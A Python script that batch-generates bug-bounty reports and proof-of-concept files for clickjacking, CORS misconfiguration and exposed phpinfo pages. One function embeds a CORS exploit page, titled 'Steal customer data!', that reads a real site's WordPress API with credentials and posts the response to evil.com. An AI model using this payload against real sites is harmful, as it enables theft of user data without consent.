from urllib.request import urlopen
import requests
from sys import argv, exit

__author__ = 'HARSHAD_PACHORE'
#PHPINFO
def create_poc3(url,incr):
    BASE = 'https://render-tron.appspot.com/screenshot/'
    url1 = str(url)
    print(url1)
    path = str(incr)+'S.jpg'
    response = requests.get(BASE + url1 + "/?width=1440&height=825", stream=True)
    if response.status_code == 200:
        with open(path, 'wb') as file:
            for chunk in response:
                file.write(chunk)   

def create_rep3(url,date,incr):
    ''' create HTML page of given URL '''

    code = """
Name: Harshad Pachore
Contact: pachoreharshad21@gmail.com
Date : {}

Vulnerability name: PHP info page disclosure 

Vulnerable Url’s:  {}

Summary:
1.php is a debug functionality that prints out detailed information on both the system and the PHP configuration.
Step-by-step Reproduction Instructions
1.Go to : {}
Impact
An attacker can obtain information such as:
•Exact PHP version.
•Exact OS and its version.
•Details of the PHP configuration.
•Loaded PHP extensions and their configurations.
This information can help an attacker gain more information on the system. After gaining detailed information, the attacker can research known vulnerabilities for that system under review. The attacker can also use this information during the exploitation of other vulnerabilities
Ref :
US. DOD :  https://hackerone.com/reports/1050912
https://hackerone.com/reports/165930
POC Screenshot attached

    """.format(date,url,url)

    with open(str(incr)+"Report#P.docx", "w") as f:
        f.write(code)
        f.close()
    
#CLICKJAKING REPORT
def create_rep1(url,date,incr):
    ''' create HTML page of given URL '''
    code = """
Name: Harshad Pachore
Contact: pachoreharshad21@gmail.com
Date: {}


Issue : {} is vulnerable to Clickjacking attacks due to missing X-Frame-Options 

While performing security testing of your website I have found the vulnerability called Clickjacking.


What is Clickjacking ?
Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.
The server didn't return an X-Frame-Options header which means that this website could be at risk of a clickjacking attack. The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe>. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.
This vulnerability affects Web Server.

Steps to Reproduce / POC

Vulnerable Url: {}

Put above url in the code of iframe, which is given below

<!DOCTYPE HTML>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I Frame</title>
</head>
<body>
<h3>clickjacking vulnerability</h3>
<iframe src="{}”  height="550px" width="700px"></iframe>
</body>
</html>

Reference : 
https://hackerone.com/reports/728004
https://hackerone.com/reports/389145
https://hackerone.com/reports/231434

Notice that site is visible in the Iframe
POC is in the attachments. Thanks, waiting for your response.


    """.format(date,url,url,url)

    with open(str(incr)+"Report#CL.docx", "w") as f:
        f.write(code)
        f.close()

def create_poc(url,incr):
    ''' create HTML page of given URL '''

    code = """
<!DOCTYPE HTML>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I Frame</title>
</head>
<body>
<h3>clickjacking vulnerability</h3>
<iframe src="{}”  height="700px" width="700px"></iframe>
</body>
</html>
    """.format(url)

    with open(str(incr)+"CLPOC.html", "w") as f:
        f.write(code)
        f.close()

# CORS REPORT

def create_poc2(url,incr):
    ''' create HTML page of given URL '''

    code = """
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal customer data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from blog.yelp.com about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://app.zpkolhapur.gov.in:443/wp-json", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
    """.format(url)

    with open(str(incr)+"CORSPOC.html", "w") as f:
        f.write(code)
        f.close()

def create_rep2(url,date,incr):
    ''' create HTML page of given URL '''
    code = """
Harshad Pachore
pachoreharshad21@gmail.com
Date : {}

Vulnerability name: Bypassing CORS Misconfiguration Leads to Sensitive Exposure  
Vulnerable Url: {}
It's possible to get information about the users registered (such as: id, name, login name, etc.) without authentication in Wordpress via API on  {}

By default Wordpress allow public access to Rest API to get informations about all users registered on the system. Platform(s) Affected: [website]  {}
Reference  :
U. S. DOD : https://hackerone.com/reports/896093
Impact
1) It's possible to get all the users registered on the system and create a bruteforce directed to these users. 
2) Cross Misconfiguration -Leakage Sensitive Information
Steps to Reproduce
1) Repreat URL Vulnerable to Burp Suite 
2) If you add the Origin-parameter to the Request-header, the responsive header will reject 
3) Bypassing Using Exploit CORS-With Sensitive 
4) Open Request Vulnerability URL in /wp-json/` , when you open the url, you can see path-routes`` disclousure
Proof On Concept:

6) Open CORS.html file attached with report in browser , sensitive has been exposure

POC Screenshots and html file attached :

Suggested Mitigation/Remediation Actions

There are 2 ways that it's possible to fix this problem. 
FIX 1 - It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request. Reference: https://github.com/WP-API/WP-API/issues/2338 
FIX 2 - It's also possible to create a rewrite rule on .htaccess (if the webserver it's Apache) to redirect any request that contain restroute (eg.: "^.restroute=/wp/") to a Not Found (404) or a Default Page.

POC Screenshot,HTML file attached.

    """.format(date,url,url,url,url)

    with open(str(incr)+"Report#C.docx", "w") as f:
        f.write(code)
        f.close()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def main():
    ''' Everything comes together '''
	
    try: sites = open(argv[1], 'r').readlines()
    except: print("[*] Usage: python(3) clickjacking_tester.py <file_name>"); exit(0)
    dat=str(argv[2])
    if str(argv[3])=="-h":
        print( bcolors.HEADER +"""\
____________________________________________________________________
 ____  _____ ____   ___  ____ _______        _____ ____ _____ _____ 
|  _ \| ____|  _ \ / _ \|  _ \_   _\ \      / /_ _|  _ \_   _| ____|
| |_) |  _| | |_) | | | | |_) || |  \ \ /\ / / | || |_) || | |  _|  
|  _ <| |___|  __/| |_| |  _ < | |   \ V  V /  | ||  _ < | | | |___ 
|_| \_\_____|_|    \___/|_| \_\|_|    \_/\_/  |___|_| \_\|_| |_____| """+ bcolors.ENDC + bcolors.OKBLUE +"""
                                                       (Version 1.0)  """ + bcolors.ENDC + bcolors.FAIL +"""
    #Developed By harsh21_p #Contact:pachoreharshad21@gmail.com """ + bcolors.ENDC + bcolors.OKGREEN + """ 

            THIS TOOL IS FOR BASIC VULNERAILITY SCANING """+bcolors.ENDC+ bcolors.HEADER + """
____________________________________________________________________ 
   """+ bcolors.ENDC)
        print(bcolors.BOLD + "\nChoice Report Templet : \n\n 1] Clickjaking Report \n 2] CORS Report \n 3] PHPINFO Page \n" + bcolors.ENDC)
        val = int(input(bcolors.OKCYAN +"Enter your choice : "+ bcolors.ENDC))
    else:
        val=int(argv[3])
    incr = 0

    for site in sites[0:]:
        
        if val==1 :
            print(bcolors.OKBLUE +"\n[*]Writing Report for "+ bcolors.ENDC + bcolors.OKGREEN + site + bcolors.ENDC)
            create_rep1(site.split('\n')[0],dat,incr)
            print(bcolors.HEADER +"Report Created.\n"+bcolors.ENDC)
            create_poc(site.split('\n')[0],incr)
            print(bcolors.OKCYAN+" [*] Created a Report & POC and saved to Report.docx & <URL>.html")
            incr=incr+1
        elif val==2 :
            print("\n[*]Writing Report for " + site)
            create_rep2(site.split('\n')[0],dat,incr)
            print("Report Created.\n")
            #create_poc2(site.split('\n')[0],incr)
            #print(" [*] Created a POC and saved to <URL>.html")
            incr=incr+1
        elif val==3:
            print("\n[*]Writing Report for " + site)
            create_rep3(site.split('\n')[0],dat,incr)
            print("Report Created.\n")
            create_poc3(site.split('\n')[0],incr)
            print(" [*] Created a POC and saved to screenshot.png")
        else:
            print("Enter valid option")

        
		
if __name__ == '__main__': main()